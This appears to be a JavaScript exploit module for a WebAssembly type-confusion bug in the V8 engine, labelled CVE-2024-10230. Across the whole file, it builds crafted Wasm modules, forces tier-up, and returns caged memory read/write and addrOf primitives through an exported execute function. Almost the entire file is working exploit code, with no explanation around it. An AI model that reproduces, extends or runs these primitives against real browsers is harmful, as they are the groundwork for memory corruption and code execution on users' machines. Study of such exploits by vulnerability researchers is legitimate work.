function cagedrw_factory(tieringBudget) {
    function func(obj) {
        return obj;
    }

    let builder_0 = new WasmModuleBuilder();
    let $s0_0 = builder_0.addStruct([makeField(kWasmI64, true)]);
    let $s1_0 = builder_0.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_0), true)]);
    let $sig_s1_ar_0 = builder_0.addType(makeSig([kWasmAnyRef], [wasmRefType($s1_0)]));
    let $i_0 = builder_0.addImport('import', 'func', $sig_s1_ar_0);
    builder_0.addTable(wasmRefType($sig_s1_ar_0), 1, 1, [kExprRefFunc, $i_0]).exportAs('table');


    let instance_0 = builder_0.instantiate({ import: { func } });
    let { table } = instance_0.exports;

    let builder = new WasmModuleBuilder();

    // Order here matters!
    let $s0_1 = builder.addStruct([makeField(kWasmI64, true)]);
    let $s1_1 = builder.addStruct([makeField(kWasmExternRef, true), makeField(kWasmI32, true)]);      // src type
    let $s2_1 = builder.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_1), true)]);  // tgt type, equiv. $s1_0
    
    let $sig_s2_ar_1 = builder.addType(makeSig([kWasmAnyRef], [wasmRefType($s2_1)]));                 // equiv. $sig_s1_ar_0
    let $t_1 = builder.addImportedTable('import', 'table', 1, 1, wasmRefType($sig_s2_ar_1));

    builder.addFunction('tierup', makeSig([], [])).addLocals(wasmRefType($s2_1), 1).addBody([

        // local.set 0 w/ ref $s2_1
        ...wasmI32Const(0),
        kGCPrefix, kExprStructNewDefault, $s0_1,
        kGCPrefix, kExprStructNew, $s2_1,
        kExprLocalSet, 0,

        // call table[0][0]
        kExprLocalGet, 0,
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,
        kExprDrop,
        // call table[0][0]
        kExprLocalGet, 0,
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,
        kExprDrop,
    ]).exportFunc();

    builder.addFunction('cagedRead', makeSig([kWasmI32], [kWasmI64])).addLocals(wasmRefType($s1_1), 1).addBody([
        kExprRefNull, kNullExternRefCode,
        kExprLocalGet, 0,
        ...wasmI32Const(7),
        kExprI32Sub,
        kGCPrefix, kExprStructNew, $s1_1,
        kExprLocalSet, 1,

        // call table[0][0]
        kExprLocalGet, 1,
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,


        kGCPrefix, kExprStructGet, $s2_1, 1,

        kGCPrefix, kExprStructGet, $s0_1, 0,
    ]).exportFunc();

    builder.addFunction('cagedWrite', makeSig([kWasmI32, kWasmI64], [])).addBody([
        kExprRefNull, kNullExternRefCode,
        kExprLocalGet, 0,
        ...wasmI32Const(7),
        kExprI32Sub,
        kGCPrefix, kExprStructNew, $s1_1,

        // call table[0][0]
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,


        kGCPrefix, kExprStructGet, $s2_1, 1,

        kExprLocalGet, 1,
        kGCPrefix, kExprStructSet, $s0_1, 0,
    ]).exportFunc();

    let instance = builder.instantiate({ import: { table } });
    for (let x = 0; x < tieringBudget; x++) {
        instance.exports.tierup();
    }

    return {
        cagedRead : (addr) => instance.exports.cagedRead(Number(addr) - 1),
        cagedWrite : (addr, value) => instance.exports.cagedWrite(Number(addr) - 1, value),
    };
}

function addrOf_factory(tieringBudget, cagedRead) {
    function func(obj) {
        return obj;
    }

    let builder_0 = new WasmModuleBuilder();
    let $s0_0 = builder_0.addStruct([makeField(kWasmI64, true), makeField(kWasmI64, true), makeField(kWasmI64, true), makeField(kWasmI64, true)]);
    let $s1_0 = builder_0.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_0), true)]);
    let $sig_s1_ar_0 = builder_0.addType(makeSig([kWasmAnyRef], [wasmRefType($s1_0)]));
    let $i_0 = builder_0.addImport('import', 'func', $sig_s1_ar_0);
    builder_0.addTable(wasmRefType($sig_s1_ar_0), 1, 1, [kExprRefFunc, $i_0]).exportAs('table');


    let instance_0 = builder_0.instantiate({ import: { func } });
    let { table } = instance_0.exports;

    let builder = new WasmModuleBuilder();

    // Order here matters!
    let $s0_1 = builder.addStruct([makeField(kWasmI64, true), makeField(kWasmI64, true), makeField(kWasmI64, true), makeField(kWasmI64, true)]);
    let $s1_1 = builder.addStruct([makeField(kWasmExternRef, true), makeField(kWasmExternRef, true)]);      // src type
    let $s2_1 = builder.addStruct([makeField(kWasmI32, true), makeField(wasmRefType($s0_1), true)]);  // tgt type, equiv. $s1_0
    
    let $sig_s2_ar_1 = builder.addType(makeSig([kWasmAnyRef], [wasmRefType($s2_1)]));                 // equiv. $sig_s1_ar_0
    let $t_1 = builder.addImportedTable('import', 'table', 1, 1, wasmRefType($sig_s2_ar_1));

    builder.addFunction('tierup', makeSig([], [])).addLocals(wasmRefType($s2_1), 1).addBody([
        // local.set 0 w/ ref $s2_1
        ...wasmI32Const(0),
        kGCPrefix, kExprStructNewDefault, $s0_1,
        kGCPrefix, kExprStructNew, $s2_1,
        kExprLocalSet, 0,

        // call table[0][0]
        kExprLocalGet, 0,
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,
        kExprDrop,
        // call table[0][0]
        kExprLocalGet, 0,
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,
        kExprDrop,
    ]).exportFunc();

    builder.addFunction('addrOf', makeSig([kWasmExternRef], [kWasmI64])).addLocals(wasmRefType($s1_1), 1).addBody([
        kExprRefNull, kNullExternRefCode,
        kExprLocalGet, 0,
        kGCPrefix, kExprStructNew, $s1_1,
        kExprLocalSet, 1,

        // call table[0][0]
        kExprLocalGet, 1,
        ...wasmI32Const(0),
        kExprCallIndirect, $sig_s2_ar_1, $t_1,


        kGCPrefix, kExprStructGet, $s2_1, 1,

        kGCPrefix, kExprStructGet, $s0_1, 0,
        
    ]).exportFunc();

    let instance = builder.instantiate({ import: { table } });
    for (let x = 0; x < tieringBudget; x++) {
        instance.exports.tierup();
    }

    let obj_arr = [{}, {}, {}, {}, {}, {}];
    return {
        addrOf : (obj) => {
            obj_arr[0] = obj;

            // Expose the backing store of the Object array using the addrOf export
            let backing_store = instance.exports.addrOf(obj_arr) & 0xffffffffn;
            return cagedRead(Number(backing_store + 0x08n)) & 0xffffffffn;
        }
    };
}


export async function execute(version) {
    await console.log('Executing CVE-2024-10230');

    let { cagedRead, cagedWrite } = cagedrw_factory(500);
    let { addrOf } = addrOf_factory(500, cagedRead);

    return {
        cagedRead: cagedRead,
        cagedWrite: cagedWrite,
        addrOf: addrOf,
    };
}